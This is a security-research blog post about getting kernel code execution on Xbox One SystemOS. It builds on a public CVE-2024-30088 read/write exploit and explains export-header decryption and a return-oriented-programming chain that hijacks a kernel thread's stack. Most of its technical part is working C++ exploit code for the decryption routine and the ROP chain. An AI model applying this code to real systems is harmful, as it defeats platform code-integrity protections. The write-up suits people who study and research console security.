+++
author = "xitska"
title = "Collat - Achieving code execution in SystemOS"
date = "2025-07-18"
description = "The process of achieving code execution in Xbox One SystemOS."
tags = ['xbox']
+++
Last year, a kernel exploit targeting Xbox One SystemOS was released, utilizing [CVE-2024-30088](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088). This allowed for the reading and writing of kernel memory. This opened a huge possibility for new research on a recent OS version, and was my personal entry into the Xbox One scene.  
If you are unaware of the exploit you can find more info on its [GitHub](https://github.com/exploits-forsale/collateral-damage).

## Okay, so what's next?
With kernel read/write, the next logical step would be to achieve some form of kernel code execution.
In an ideal world, this would be in the form of either loading a driver, or executing shellcode, but we're exploiting a system where code integrity is enforced via the hypervisor, meaning: 
- We cannot *simply* allocate executable pages in kernel-mode, or make read/write pages executable, defeating the possibility of running shellcode.
- We cannot load drivers due to both ***Driver Signature Enforcement (DSE)***, and the ***Xbox Code Integrity (XCI)*** catalogues.
  
This leaves us with only a selection of possibilities: either overwriting a function pointer ***or*** exploiting the stack to achieve execution via *return-oriented programming*.  
Whilst overwriting a function pointer would likely be simpler to implement, it imposes huge limitations, due to the presence of ***kCFG***. Not to mention, locating a suitable function pointer to overwrite and take control of would be like finding a needle in a haystack.  
With this in mind, the only logical choice is to exploit the stack! 

## Exploiting the stack
Currently, any process running at a medium integrity level can "leak" the kernel address of any object, *provided the process has the SeDebugPriveledge token*. This can be done by calling *NtQuerySystemInformation*, and enumerating the handles table.  
Utilizing this concept, we can create a new thread in a suspended state, and leak the kernel object address to retrieve the kernel stack base and limit. Once you have located the stack, execution is as simple as locating a suitable return address on the stack, in our case this is `KiApcInterrupt`, and overwriting it with a ROP chain.  
  
If you're looking for more details on how this works, I encourage you to read *Connor McGarr's blog post on the topic, [Exploit Development: No Code Execution? No Problem!](https://connormcgarr.github.io/hvci/)* It served as a foundation for this project and is an incredible read!

## Crafting our ROP chain
The goal for this project was to provide **simple** way of dynamically executing Windows kernel functions, in a similar way to [KernelForge](https://github.com/Cr4sh/KernelForge). The idea of being able to dynamically create a ROP chain to call single functions seemed to be perfect for prototyping and research.  
Initially I had simply wanted to port the entirety of KernelForge over to the Xbox but due to differences within the kernel, I had decided it would be easier (and cleaner) to rewrite the project as a whole.  
Now we're rewriting the project, the main differences we need to address are:
- The encryption of the *ntoskrnl.exe* image headers for locating exports.
- The lack of a dispatcher function (`_guard_retpoline_exit_indirect_rax`)
### Decrypting the image headers
When I first dumped the kernel I was baffled and thought my dump **had** to be incorrect, as the headers simply seemed to be garbage, but this turned out to be false.  
Considering everything else was reading properly, I had to assume the dump was correct, making the next logical step the investigation of `MmGetSystemRoutineAddress` and by extension `RtlFindExportedRoutineByName`, as there was no possible way for these routines to function without **valid** image headers -- unless implementation had differed substantially.

Looking at `RtlFindExportedRoutineByName`, we can see that if the we are looking for a kernel routine, we see a call to `sub_fffff800403f805c`. Referencing a generic Windows kernel, we can see this call typically isn't present and is therefore a perfect place to look.

![RtlFindExportedRoutineByName](/RtlFindExportedRoutineByName_screenshot.png)


![sub_fffff800403f805c](/sub_fffff800403f805c.png)
Looking at this function, it is clear to see that export data is decrypted using two different keys before it is actually referenced. Whilst this only covers export data, `RtlImageNtHeaderEx` also shows usage of the same keys, to retrieve a pointer to the *IMAGE_NT_HEADERS* structure:
![RtlImageNtHeaderEx](/pntheader_decryptionn.png)

Those familiar with Windows internals *may* recognise this to be similar to the cryptography used for the `KdDebuggerDataBlock` from the vanilla Windows kernel builds:
![KdDebuggerDataBlock](/windows_debug_decryption.png)

Referencing a typical Windows build, we can assume that the ROL amount is *actually* just the first byte of the key. *This is also shown in the disassembly of the function:*
```nasm
mov r8, 0xb0837d93c0205f6e ; First XOR key (or `KiWaitNever`)
mov rcx, r8
mov rdx, r8
xor rdx, qword [r11]
rol rdx, cl                ; Uses the first byte of said key
```

With this in mind, things are pretty simple... right? We just copy the keys, reimplement the decryption function, and call it on our own copy of the headers that we have read from the kernel. But there is one *slight* catch!  
  
Similar to a typical Windows kernel, these keys are generated at runtime.  
Windows 11 simply queries the CPU timestamp counter (`rdtsc`) during `KiInitializeKernel` and derives the keys from that.  
It can be assumed that this is also done on the Xbox but rather than happening during kernel initialization, it *may* instead be handled by the VM manager as these keys are then patched into every function that uses them.  
Now that we are aware of this, we can simply read the keys out of any function of our choosing (f.e: `RtlImageNtHeaderEx`), and use those in our decryption. *See below for my implementation:*
```cpp
uint64_t debug_block_decrypt(uint64_t module_base, uint64_t data) {
    return _byteswap_uint64(
        module_base ^ _rotl64(
            _ioring->raw_read<uint64_t>((void*)(data)) ^ _debug_block_keys[0],
            (char)_debug_block_keys[0])
    ) ^ _debug_block_keys[1];
}
```
Using this, I decrypted the export data for each module and created a map of all the exports which can be simply queried via a function call:
```cpp
collat::kmodule::get_export("ntoskrnl.exe", "ExAllocatePool2")
```

Ultimately, the reason for this encryption is still unknown. Whilst research hasn't been done I would assume the encryption is handled by the VM manager in HostOS, as the VBI, or the *virtual boot image*, doesn't  include encryption on the kernel headers.

### Finally, crafting the ROP chain (without a dispatcher)
The ability to decrypt exports means we no longer have to rely so much on offsets, making the process of prototyping and crafting a ROP chain **much** simpler.
The general idea is for our ROP chain is:
1) Pass any function arguments
2) Call the request kernel function
3) Retrieve the return value
4) Signal our completion event (just for speed and reliability)
5) Terminate the thread to avoid a bugcheck

Provided we sufficient knowledge of the Microsoft 64-bit calling convention, this should be pretty simple. The main things we need to be aware of are:
- The 32 byte stack shadow space, which is mainly used for saving parameters. Failure to account for this *could* lead to corruption of our ROP chain!
- Stack alignment, for XMM registers. Some Windows functions make use of *SIMD* instructions meaning the call stack should always be aligned, otherwise the CPU raises a general protection fault!
- Allocation of space for stack arguments (after the shadow region). In our case, our gadget can adjust the stack by 120 bytes, giving us space for a total of 19 parameters.

Keeping this in mind we can craft our ROP chain like so:
```cpp
#define STACK_PUT(type, val) \
    ioring->write64<type>(ullRetAddress + stackOffset, val); \
    stackOffset += 8;

// Pop our first 4 arguments into the required registers
if (argcnt > 0) {
	STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
	STACK_PUT(void*, arguments.at(0));
}

if (argcnt > 1) {
	STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
	STACK_PUT(void*, arguments.at(1));
}

if (argcnt > 2) {
	STACK_PUT(uint64_t, get_gadget("pop r8; ret"));
	STACK_PUT(void*, arguments.at(2));
}

if (argcnt > 3) {
	STACK_PUT(uint64_t, get_gadget("pop r9; ret"));
	STACK_PUT(void*, arguments.at(3));
}


// Call the function
STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
STACK_PUT(void*, address);
STACK_PUT(uint64_t, get_gadget("jmp rax"));

// Adjust the stack for extra arguments
STACK_PUT(uint64_t, get_gadget("add rsp, 0x78; ret"));

// Manual alignment for stack pivot
STACK_PUT(uint64_t, get_gadget("ret")) 
	
int usedSpace = 0;
if (argcnt > 4) {	
	// Setup 0x20 byte shadow region
	for (int i = 0; i < 4; i++) {
		STACK_PUT(uint64_t, get_gadget("ret"));
		usedSpace++;
	}

	// Put extra arguments onto the stack
	for (int i = 4; i < argcnt; i++) {			
		STACK_PUT(void*, arguments.at(i));
		usedSpace++;
	}		
}

// Padding for stack adjustment if necessary
for (int i = 0; i < ((0x78 / 8) - usedSpace); i++) {
	STACK_PUT(uint64_t, get_gadget("ret"));
}

// Align the stack to 16 bytes if necessary
if ((stackOffset / 8) % 2) {
	spdlog::debug("unaligned stack (0x{:x}), aligning.", stackOffset);
	STACK_PUT(uint64_t, get_gadget("ret"));
}

// Pass the return value back to user-mode
uint64_t returnValue = 0;
STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
STACK_PUT(uint64_t, (uint64_t) & returnValue);
STACK_PUT(uint64_t, get_gadget("mov [rcx], rax; ret"));

// Signal our completion event
STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
STACK_PUT(uint64_t, (uint64_t)hEvent);
STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
STACK_PUT(uint64_t, 0);
STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
STACK_PUT(uint64_t,
    (uint64_t)collat::kmodule::get_export("ntoskrnl.exe", "ZwSetEvent")
);
STACK_PUT(uint64_t, get_gadget("jmp rax"));		

// Terminate the current thread for cleanup (ZwTerminateThread)
STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
STACK_PUT(uint64_t, (uint64_t)hThread);
STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
STACK_PUT(uint64_t, STATUS_SUCCESS);
STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
STACK_PUT(uint64_t, (uint64_t)collat::kmodule::get_base("ntoskrnl.exe") + OFFSET_ZWTERMINATETHREAD);
STACK_PUT(uint64_t, get_gadget("jmp rax"));
```

Once our stack is set-up and prepared, execution is as simple as resuming the thread, waiting for our event to be signalled, and returning the return value:
```cpp
ResumeThread(hThread);
WaitForSingleObject(hEvent, INFINITE);
CloseHandle(hEvent);

return returnValue;
```

## Conclusion / Future Research
For the past decade, the Xbox One has remained mostly secure with only minor bugs appearing on occasion. This security is largely stemmed from the containerization of the system.  
  
Stream lined code-execution on SystemOS could potentially open up a possibility of breaking out of this container into HostOS or the hypervisor, *though that is wishful thinking*.  

If you would like to take a look at or make use of the code for this project, it is readily available on my GitHub: [xitska/collat](https://github.com/xitska/collat). 

Anyways, thank you for reading my first blog post! Hopefully I can get a couple more out in the future :)

## Acknowledgements 
This project would have not been possible without a large number of amazing people and sources, some including:
- [Emma Kirkpatrick](https://x.com/carrot_c4k3) - for the original exploit research, code and help understanding how it works.
- [Cr4sh](https://github.com/Cr4sh/) - for [*KernelForge*](https://github.com/Cr4sh/KernelForge) which acted as inspiration for this project
- [Connor McGarr](https://x.com/33y0re) - for his [*No Code Execution? No Problem!*](https://connormcgarr.github.io/hvci/) blog post
- And everybody in the Xbox One scene!